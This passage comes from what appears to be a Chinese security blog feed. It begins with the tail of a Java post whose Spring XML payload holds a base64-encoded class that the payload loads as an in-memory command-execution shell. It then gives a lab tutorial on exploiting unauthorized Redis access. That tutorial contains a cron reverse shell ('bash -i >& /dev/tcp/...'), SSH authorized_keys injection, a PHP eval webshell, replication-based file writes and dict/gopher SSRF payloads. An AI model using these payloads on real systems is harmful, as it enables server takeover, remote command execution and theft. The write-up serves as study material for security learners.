&lt;value&gt;yv66vgAAADIBOwEAXm9yZy9hcGFjaGUvY29tbW9tcy9iZWFudXRpbHMvY295b3RlL2ludHJvc3BlY3QvQW5ub3RhdGVkTWVtYmVyMjA5ZjAxMzVmYzM5NDY2ZDg0ZWY3NWZlODA2YmZjYjgHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcABwwABQAGCgAEAAkBAANydW4MAAsABgoAAgAMAQAQZ2V0UmVxSGVhZGVyTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAPWC1BdXRob3JpemF0aW9uCAAQAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwASAQATamF2YS9sYW5nL1Rocm93YWJsZQcAFAEAEGphdmEvbGFuZy9UaHJlYWQHABYBAApnZXRUaHJlYWRzCAAYAQAPamF2YS9sYW5nL0NsYXNzBwAaAQASW0xqYXZhL2xhbmcvQ2xhc3M7BwAcAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAeAB8KABsAIAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAIgEADXNldEFjY2Vzc2libGUBAAQoWilWDAAkACUKACMAJgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAKAApCgAjACoBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAsAQAHZ2V0TmFtZQwALgAPCgAXAC8BAARodHRwCAAxAQAQamF2YS9sYW5nL1N0cmluZwcAMwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAA1ADYKADQANwEACEFjY2VwdG9yCAA5AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAA7ADwKAAQAPQEABnRhcmdldAgAPwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAEEAQgoAGwBDAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAEUKAEYAJgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABIAEkKAEYASgEACGVuZHBvaW50CABMAQAGdGhpcyQwCABOAQAHaGFuZGxlcggAUAEADWdldFN1cGVyY2xhc3MMAFIAPAoAGwBTAQAGZ2xvYmFsCABVAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABXAFgKABsAWQEAIm9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3RHcm91cEluZm8IAFsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAF0BAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DABfAGAKAF4AYQoAGwAvAQAKcHJvY2Vzc29ycwgAZAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAGYBAARzaXplAQADKClJDABoAGkKAGcAagEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwASABsCgBnAG0BAANyZXEIAG8BAAdnZXROb3RlCABxAQARamF2YS9sYW5nL0ludGVnZXIHAHMBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAHUAdgkAdAB3AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAHkAegoAdAB7AQAJZ2V0SGVhZGVyCAB9AQAJZ2V0TWV0aG9kDAB/AB8KABsAgAwADgAPCgACAIIBAAtnZXRSZXNwb25zZQgAhAEACWdldFdyaXRlcggAhgEADmphdmEvaW8vV3JpdGVyBwCIAQAGaGFuZGxlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAIoAiwoAAgCMAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAI4AjwoAiQCQAQAFZmx1c2gMAJIABgoAiQCTAQAFY2xvc2UMAJUABgoAiQCWAQAEZXhlYwEAB29zLm5hbWUIAJkBABBqYXZhL2xhbmcvU3lzdGVtBwCbAQALZ2V0UHJvcGVydHkMAJ0AiwoAnACeAQALdG9Mb3dlckNhc2UMAKAADwoANAChAQADd2luCACjAQAHL2Jpbi9zaAgApQEAAi1jCACnAQAHY21kLmV4ZQgAqQEAAi9jCACrAQARamF2YS9sYW5nL1J1bnRpbWUHAK0BAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DACvALAKAK4AsQEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAJgAswoArgC0AQARamF2YS9sYW5nL1Byb2Nlc3MHALYBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DAC4ALkKALcAugEAEWphdmEvdXRpbC9TY2FubmVyBwC8AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAFAL4KAL0AvwEAAlxhCADBAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADDAMQKAL0AxQEAAAgAxwEAB2hhc05leHQBAAMoKVoMAMkAygoAvQDLAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAM0KAM4ACQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwA0ADRCgDOANIBAARuZXh0DADUAA8KAL0A1QEACHRvU3RyaW5nDADXAA8KAM4A2AEACmdldE1lc3NhZ2UMANoADwoACADbAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcA3QEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAN8BAAZleUplWEEIAOEBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaDADjAOQKADQA5QEABmxlbmd0aAwA5wBpCgA0AOgBAAZjaGFyQXQBAAQoSSlDDADqAOsKADQA7AEAFShDKUxqYXZhL2xhbmcvU3RyaW5nOwwAeQDuCgA0AO8BAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQwA8QDyCgB0APMBAAEuCAD1AQAHaW5kZXhPZgwA9wDyCgA0APgBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7DAD6APsKADQA/AEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAP4A/woAAgEAAQABeAEABihbQilbQgwBAgEDCgACAQQBAAUoW0IpVgwABQEGCgA0AQcBAAYvOWovNEEIAQkMAJgAiwoAAgELAQAIZ2V0Qnl0ZXMBAAQoKVtCDAENAQ4KADQBDwEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsMAREBEgoAAgETAQAFLzlrPT0IARUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAEXAQAHZm9yTmFtZQwBGQBgCgAbARoBAAxkZWNvZGVCdWZmZXIIARwBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAEeAR8KABsBIAEAAltCBwEiAQAQamF2YS51dGlsLkJhc2U2NAgBJAEACmdldERlY29kZXIIASYBAAZkZWNvZGUIASgBAApnZXRFbmNvZGVyCAEqAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBLAEADmVuY29kZVRvU3RyaW5nCAEuAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcggBMAEABmVuY29kZQgBMgEADz8/Pz8/Pz8/Pz8/Pz8/PwgBNAEACDxjbGluaXQ+CgACAAkBAARDb2RlAQAKRXhjZXB0aW9ucwEADVN0YWNrTWFwVGFibGUAIQACAAQAAAAAAAkAAQAFAAYAAgE4AAAAFQABAAEAAAAJKrcACiq3AA2xAAAAAAE5AAAABAABAAgAAgAOAA8AAQE4AAAADwABAAEAAAADEhGwAAAAAAACAAsABgABATgAAAMpAAYACwAAAkYSFxIZA70AG8AAHbYAIUwrBLYAJysBA70ABLYAK8AALcAALcAALU0DPh0svqICFSwdMrYAMBIytgA4mQIBLB0ytgAwEjq2ADiZAfMsHTK2AD4SQLYARDoEGQQEtgBHGQQsHTK2AEs6BRkFtgA+Ek22AEQ6BKcAEToGGQW2AD4ST7YARDoEGQQEtgBHGQQZBbYASzoFGQW2AD4SUbYARDoEpwArOgYZBbYAPrYAVBJRtgBEOgSnABc6BxkFtgA+tgBUtgBUElG2AEQ6BBkEBLYARxkEGQW2AEs6BRkFtgA+Ela2AEQ6BKcAFDoGGQW2AD62AFQSVrYARDoEGQQEtgBHGQQZBbYASzoFGQW2AD62AFoSXLYAYlcZBbYAPrYAYxJctgA4mQEXGQW2AD4SZbYARDoEGQQEtgBHGQQZBbYAS8AAZzoGAzYHFQcZBrYAa6IA7BkGFQe2AG62AD4ScLYARDoEGQQEtgBHGQQZBhUHtgButgBLtgA+EnIEvQAbWQOyAHhTtgAhGQQZBhUHtgButgBLBL0ABFkDBLgAfFO2ACs6BRkEGQYVB7YAbrYAS7YAPhJ+BL0AG1kDEjRTtgCBGQQZBhUHtgButgBLBL0ABFkDKrcAg1O2ACvAADQ6CBkIxgBPGQW2AD4ShQO9ABu2ACEZBQO9AAS2ACs6CRkJtgA+EocDvQAbtgCBGQkDvQAEtgArwACJOgoZChkIuACNtgCRGQq2AJQZCrYAl6cADqcABToJhAcBp/8QhAMBp/3rpwAETLEABgBoAHQAdwATAJQAoACjABMApQC0ALcAEwDaAOYA6QATAaMCLQIzAAgAAAJBAkQAFQABAToAAAChABD+ACkHACMHAC0B/wBNAAYHAAIHACMHAC0BBwBGBwAEAAEHABMNXQcAE/8AEwAHBwACBwAjBwAtAQcARgcABAcAEwABBwAT+gATXQcAExD9AE0HAGcB/ADnBwA0/wACAAgHAAIHACMHAC0BBwBGBwAEBwBnAQABBwAIAf8ABQAEBwACBwAjBwAtAQAABf8AAgABBwACAAEHABX8AAAHAAQACgCYAIsAAQE4AAAA4wAEAAcAAACTBDwSmrgAn00sxgARLLYAohKktgA4mQAFAzwbmQAYBr0ANFkDEqZTWQQSqFNZBSpTpwAVBr0ANFkDEqpTWQQSrFNZBSpTTrgAsi22ALW2ALs6BLsAvVkZBLcAwBLCtgDGOgUSyDoGGQW2AMyZAB+7AM5ZtwDPGQa2ANMZBbYA1rYA07YA2ToGp//fGQawTCu2ANywAAEAAACMAI0ACAABAToAAAA2AAb9ABoBBwA0GFEHAN7/ACAABwcANAEHADQHAN4HAOAHAL0HADQAACP/AAIAAQcANAABBwAIAAoAigCLAAIBOAAAALgABgAGAAAAjxLiTAFNKiu2AOaZAIAqK7YA6bYA7bgA8LgA9D4DNgQDNgUVBR2iABsVBCortgDpBGAVBWC2AO1gNgSEBQGn/+W7ADRZKiu2AOkEYB1gFQRgKhL2tgD5tgD9uAEBuAEFtwEITbsAzlm3AM8TAQq2ANMsuAEMtgEQuAEFuAEUtgDTEwEWtgDTtgDZsCq4AQywAAAAAQE6AAAAFwAD/wAiAAYHADQHADQFAQEBAAAd+ABJATkAAAAEAAEACAAKAP4A/wACATgAAACPAAYABAAAAG8TARi4ARtMKxMBHQS9ABtZAxI0U7YAgSu2ASEEvQAEWQMqU7YAK8ABI8ABI7BMEwEluAEbTSwTAScDvQAbtgCBAQO9AAS2ACtOLbYAPhMBKQS9ABtZAxI0U7YAgS0EvQAEWQMqU7YAK8ABI8ABI7AAAQAAACwALQAIAAEBOgAAAAYAAW0HAAgBOQAAAAQAAQAIAAkBEQESAAIBOAAAAK8ABgAFAAAAegFMEwEluAEbTSwTASsBwAAdtgCBLAHAAS22ACtOLbYAPhMBLwS9ABtZAxMBI1O2AIEtBL0ABFkDKlO2ACvAADRMpwA3ThMBMbgBG00stgEhOgQZBLYAPhMBMwS9ABtZAxMBI1O2AIEZBAS9AARZAypTtgArwAA0TCuwAAEAAgBBAEQACAABAToAAAAbAAL/AEQAAgcBIwcANAABBwAI/QAzBwAbBwAEATkAAAAEAAEACAAJAQIBAwABATgAAABJAAYABAAAACoTATW2ARBMKr68CE0DPh0qvqIAFywdKh0zKx0rvnAzgpFUhAMBp//pLLAAAAABAToAAAANAAL+AA4HASMHASMBGQAIATYABgABATgAAAAuAAIAAQAAAA27AAJZtwE3V6cABEuxAAEAAAAIAAsACAABAToAAAAHAAJLBwAIAAAA&lt;/value&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">            &lt;/list&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">        &lt;/property&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;classLoader&quot;</span> class=<span class="string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;clazz&quot;</span> factory-bean=<span class="string">&quot;classLoader&quot;</span> factory-method=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg ref=<span class="string">&quot;decoder&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;5133&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean factory-bean=<span class="string">&quot;clazz&quot;</span> factory-method=<span class="string">&quot;newInstance&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">&lt;/beans&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH--</span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权</title>
    <url>/2025/08/14/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h1 id="q5QcT">Redis未授权</h1>
好早以前写的文章了

<p>在之前打比赛时，遇到一个redis未授权访问的题目，搜搜索索写进去文件了，但是最后没搞出来，好可惜了，所以学了学Redis</p>
<h2 id="FhQdW">漏洞前置基础</h2>
<h3 id="LEbcL">漏洞原理</h3>

<p>Redis在默认情况下，会绑定<strong>0.0.0.0:6379</strong>，如果没有添加防火墙规则等相关策略，则Redis会暴露在公网，如果在<strong>没有密码认证</strong>（一般为空）情况下，会导致任意用户可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据</p>
<p>攻击者可以利用Redis自身提供config命令，进行文件操作，攻击者可以将自己的ssh公钥写入目标服务的&#x2F;root&#x2F;.ssh文件夹中<strong>authotrized_keys</strong>文件中，<strong>后续可以用对应私钥直接使用ssh服务登录目标服务器</strong></p>
<h3 id="h8y8K">漏洞条件</h3>
1. redis绑定在 0.0.0.0:6379，且没有添加防火墙规则等相关策略，直接暴露在公网
2. 没有密码认证，或已经知道密码，有条件能够远程登录redis服务

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Redis <span class="number">2.</span>x，<span class="number">3.</span>x，<span class="number">4.</span>x，<span class="number">5.</span>x</span><br></pre></td></tr></table></figure>

<h3 id="K88Im">Redis常用命令</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">redis-cli -h ip -p <span class="number">6379</span> -a passwd   # 外部连接,Redis 的连接除了通过指定 IP，也可以通过指定域名</span><br><span class="line">info 								  # 查看相关redis信息</span><br><span class="line">set xz <span class="string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker</span><br><span class="line">get xz                              # 获取键xz的内容</span><br><span class="line">INCR score                          # 使用INCR命令将score的值增加<span class="number">1</span></span><br><span class="line">keys *                              # 列出当前数据库中所有的键</span><br><span class="line">config set <span class="keyword">protected</span>-mode no        # 关闭安全模式</span><br><span class="line">get anotherkey                      # 获取一个不存在的键的值</span><br><span class="line">config set dir /root/redis          # 设置保存目录</span><br><span class="line">config set dbfilename redis.rdb     # 设置保存文件名</span><br><span class="line">config get dir                      # 查看保存目录</span><br><span class="line">config get dbfilename               # 查看保存文件名</span><br><span class="line">save                                # 进行一次备份操作</span><br><span class="line">flushall                            # 删除所有数据</span><br><span class="line">del key                             # 删除键为key的数据</span><br><span class="line">slaveof ip port   					# 设置主从关系</span><br><span class="line">mset k1 v1 k2 v2 k3 v3   #批量设置键值对</span><br><span class="line">mget k1 k2 k3 		#批量获取键值对</span><br><span class="line">使用SET和GET命令，可以完成基本的赋值和取值操作；</span><br><span class="line">Redis是不区分命令的大小写的，set和SET是同一个意思；</span><br><span class="line">使用keys *可以列出当前数据库中的所有键；</span><br><span class="line">当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；</span><br><span class="line">如果键的值中有空格，需要使用双引号括起来，如<span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="VsEEu">Redis配置文件参数</h3>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">port参数：</span><br><span class="line">    格式为port后面接端口号，如port <span class="number">6379</span>，表示Redis服务器将在<span class="number">6379</span>端口上进行监听来等待客户端的连接。</span><br><span class="line"></span><br><span class="line">bind参数：</span><br><span class="line">    格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind <span class="number">192.168</span><span class="number">.47</span><span class="number">.173</span> <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>，表允许<span class="number">192.168</span><span class="number">.47</span><span class="number">.173</span>和<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>两个IP连接。如果设置为<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>则表示任意ip都可连接，说白了就是白名单。</span><br><span class="line"></span><br><span class="line">save参数：</span><br><span class="line">    格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：</span><br><span class="line">        save <span class="number">900</span> <span class="number">1</span></span><br><span class="line">        save <span class="number">300</span> <span class="number">10</span></span><br><span class="line">        save <span class="number">60</span> <span class="number">10000</span></span><br><span class="line">    表示如果数据库的内容在<span class="number">60</span>秒后产生了<span class="number">10000</span>次改变，或者<span class="number">300</span>秒后产生了<span class="number">10</span>次改变，或者<span class="number">900</span>秒后产生了<span class="number">1</span>次改变，那么立即进行备份操作。</span><br><span class="line"></span><br><span class="line">requirepass参数：</span><br><span class="line">    格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。</span><br><span class="line"></span><br><span class="line">dir参数：</span><br><span class="line">    格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。</span><br><span class="line"></span><br><span class="line">dbfilename参数：</span><br><span class="line">    格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。</span><br><span class="line"></span><br><span class="line">config命令：</span><br><span class="line">    通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>-mode参数：</span><br><span class="line">    redis3<span class="number">.2</span>之后添加了<span class="keyword">protected</span>-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为no。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Sl5tq">Redis getshell</h2>
我们看看如果通过Redis未授权访问来达到getShell

<h3 id="c04qS">环境搭建</h3>

<p>这里我直接用docker命令<code>docker pull redis:5.0.12</code>，用docker来搭建了一个漏洞环境</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736862757029-0be22a84-c8b8-4871-ba68-b822a77fa4eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736862757029-0be22a84-c8b8-4871-ba68-b822a77fa4eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>用dockerDesktop直接启动，6379端口映射到6380端口</p>
<p>使用工具进行连接（我这里用的是RedisDesktopManager）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1736862836554-b3ea7777-fce0-42a7-bb01-9df11a1ae2cb.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1736862836554-b3ea7777-fce0-42a7-bb01-9df11a1ae2cb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736862887660-05075c68-8b89-48bc-ac8b-8a376b951889.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736862887660-05075c68-8b89-48bc-ac8b-8a376b951889.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="WJSKP">GetShell方式</h3>

<p>这里我们讲解redis未授权访问拿shell的3种方式</p>
<ol>
<li>写入SSH 公钥 免密登录</li>
<li>向web中写入webshell</li>
<li>覆盖计划任务反弹shell</li>
</ol>
<h4 id="SlICC">覆盖计划任务</h4>
首先我们的攻击机监听2333端口

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736862929649-be936bb6-22fc-4857-9b69-1fd82dc04b03.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736862929649-be936bb6-22fc-4857-9b69-1fd82dc04b03.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#然后在redis的控制台中设置一个key为反弹shell的语句</span></span><br><span class="line"><span class="comment">#其中5个 * 号代表每分钟执行一次，后面为反弹shell的语句，换行是为了避免crontab的语法错误</span></span><br><span class="line"><span class="attribute">set</span> xxx <span class="string">&quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/192.168.253.128/2333 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line"><span class="comment">#然后修改路径为/var/spool/cron/</span></span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line"><span class="comment">#设置文件名为root</span></span><br><span class="line">config set dbfilename root</span><br><span class="line"><span class="comment">#最后save保存进去</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>我们可以看到，这里已经成功写入了root计划任务，等着时间到计划任务即可（由于我这里搭建redis的系统功能不全，没有成功反弹）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736863710877-95deee2b-283c-4fe5-931e-fb118d7ceaf1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736863710877-95deee2b-283c-4fe5-931e-fb118d7ceaf1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我们看一下保存下来的文件长什么样子，就知道\n的作用是什么了</p>
<p>前面会有版本等垃圾信息，为了保证我们的crontab语法不被破坏，所以需要用回车键来避免</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat root</span></span><br><span class="line"><span class="attribute">REDIS0009</span>       redis-ver5.<span class="number">0</span>.<span class="number">12</span></span><br><span class="line">redis-bits<span class="variable">@ctime</span>¡oused-mem8</span><br><span class="line">aof-preamblexxx&gt;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/<span class="number">192.168.253.128</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>\n\ndسC</span><br></pre></td></tr></table></figure>

<h4 id="ccZXx">写入SSH公钥免密登录</h4>
首先我们需要在攻击机上生成ssh公钥和私钥，密码设置为空

<p><code>**ssh-keygen -t rsa**</code></p>
<p>将公钥写入key.txt当中（文件名无限制）</p>
<p><code>**(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt**</code></p>
<p>导入内容（防止乱码）</p>
<p><code>**cat key.txt| redis-cli -h 192.168.253.135 -x set putsshkey**</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置路径</span></span><br><span class="line"><span class="attribute">config</span> set dir /root/.ssh</span><br><span class="line"><span class="comment">#设置文件名</span></span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"><span class="comment">#保存key值到root文件中</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>然后<code>ssh -i id_rsa root@192.168.253.135</code>远程登录目标系统</p>
<h4 id="iT15b">写入webshell远程连接服务器</h4>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置木马</span></span><br><span class="line"><span class="attribute">set</span> xxx <span class="string">&quot;\n\n&lt;?php eval(<span class="variable">$_GET</span>[&#x27;x&#x27;]);?&gt;\n\n&quot;</span></span><br><span class="line"><span class="comment">#然后修改路径为网站默认路径</span></span><br><span class="line">config set dir /var/www/html</span><br><span class="line"><span class="comment">#设置文件名</span></span><br><span class="line">config set dbfilename shell.php</span><br><span class="line"><span class="comment">#最后save保存进去</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><strong>利用条件：</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">知道网站根目录绝对路径（实际渗透过程中，这个方法通常需要搭配 phpinfo() 等方法使用。）</span><br><span class="line">无需是 <span class="attribute">root</span> 起的 Redis</span><br><span class="line">可适用于 Windows（非 ssh 连接）</span><br><span class="line">一般无需 flushall 清空数据库（一定情况下也需要）</span><br></pre></td></tr></table></figure>

<h3 id="RAluL">主从复制</h3>
在某些情况下，可以使用redis主从复制来进行写入文件的操作

<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在从机上设置主机</span></span><br><span class="line">127.0.0.1:6380&gt; <span class="attribute">slaveof</span> <span class="number">127.0.0.1</span> <span class="number">6381</span></span><br><span class="line">OK</span><br><span class="line"><span class="comment">#在主机上设置键值对</span></span><br><span class="line"><span class="number">127.0.0.1:6381</span>&gt; set sean sheep</span><br><span class="line">OK</span><br><span class="line"><span class="comment">#在从机上获取键值对</span></span><br><span class="line"><span class="number">127.0.0.1:6380</span>&gt; get sean</span><br><span class="line"><span class="string">&quot;sheep&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先设置好保存的路径和保存的文件名</span></span><br><span class="line">dict://192.168.33.134:6379/slaveof:192.168.33.131:6379 </span><br><span class="line">dict://192.168.33.134:6379/config:set:dir:/www/admin/localhost_80/<span class="attribute">wwwroot</span></span><br><span class="line">dict://192.168.33.134:6379/config:set:dbfilename:ssrf.php</span><br><span class="line"><span class="comment">#然后进入主机进行主从复制操作，方法和上面的一样</span></span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; set xxx <span class="string">&quot;\n\n\n&lt;?php phpinfo() ;?&gt;\n\n\n&quot;</span></span><br><span class="line"><span class="comment">#再去web端执行save操作</span></span><br><span class="line">dict://192.168.33.134:6379/save</span><br><span class="line"><span class="comment">#这样数据直接回同步到目标机，从而写入文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="EW0F1">SSRF+Redis未授权</h2>
<h3 id="Zfnuz">gopher协议</h3>
gopher协议和dict协议一样需要使用redis内置的命令进行文件写入，只是payload更加复杂

<p>我这里就用写入webshell来演示</p>
<p>下面这些是我们需要执行的命令</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flushall</span></span><br><span class="line">set <span class="number">1</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

